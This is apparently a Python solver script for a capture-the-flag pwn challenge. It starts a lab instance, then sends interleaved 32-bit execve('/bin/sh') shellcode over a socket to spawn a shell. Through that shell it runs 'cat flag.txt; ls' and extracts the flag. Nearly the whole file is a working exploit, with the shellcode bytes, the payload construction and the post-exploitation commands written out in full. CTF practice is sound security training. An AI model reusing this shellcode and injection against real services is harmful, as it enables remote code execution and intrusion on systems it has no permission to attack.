import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/184/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/184/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")  # 64-bit ? non : binaire 32 bits
# shellcode 32 bits : execve("/bin/sh",0,0)
SC32 = bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
print("shellcode 32 bits:", len(SC32), "octets | 0x0a:", b"\n" in SC32, "| 0x00:", b"\x00" in SC32)
payload = b""
for i in range(0, len(SC32), 2):
    payload += SC32[i:i + 2] + b"AA"
print("payload entrelace:", len(payload), "octets | 0x0a:", b"\n" in payload)
s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.3)
try:
    print("banner:", s.recv(300)[:100])
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls\n")
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:700])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", m.group(0) if m else None)
